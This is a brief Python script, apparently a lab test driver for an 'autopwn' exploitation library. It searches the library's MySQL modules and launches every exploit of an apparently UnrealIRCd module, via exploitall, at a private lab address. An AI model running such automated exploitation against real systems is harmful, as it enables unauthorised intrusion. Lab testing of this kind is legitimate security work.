#!/usr/bin/env python3

from autopwn import Autopwn
from pprint import pprint

import logging
log = logging.getLogger("Autopwn").setLevel(logging.DEBUG)
log = logging.getLogger("paramiko").setLevel(logging.WARNING)
log = logging.getLogger("urllib3").setLevel(logging.WARNING)


pwn = Autopwn()

#tar = "192.168.13.152"
tar = "192.168.56.3"

# MySQL
pprint(pwn.mysql.msfcore())
print("Service Name: {}".format(pwn.mysql.name))
#pprint(pwn.mysql.search())
pprint(pwn.mysql.search("mysql"))

#pwn.scoreHost(tar)
pwn.unreal.exploitall(tar)

